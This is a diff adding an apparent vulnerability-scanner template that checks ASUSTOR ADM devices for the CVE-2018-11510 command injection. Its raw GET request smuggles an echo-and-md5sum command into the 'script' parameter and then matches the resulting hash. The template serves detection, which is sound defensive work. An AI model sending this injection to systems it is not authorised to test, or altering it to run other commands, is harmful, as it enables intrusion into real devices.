@@ -1,0 +1,29 @@
+id: CVE-2018-11510
+
+info:
+  name: ASUSTOR ADM Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    ASUSTOR ADM operating system has a remote command execution vulnerability due to improper input sanitization. Unauthenticated attackers can inject and execute arbitrary commands via the 'script' parameter in the 'portal/apis/aggrecate_js.cgi' path.
+  tags: command-execution
+  classification:
+    cve-id: CVE-2018-11510
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        GET /portal/apis/aggrecate_js.cgi?script=launcher%22%26echo%20-n%20%27zzza123456%27|md5sum|cut%20-d%20%27%20%27%20-f1%26%22 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "a6c7f3663fe821e897c453945f3da784"
+        part: body
+      - type: status
+        status:
+          - 200
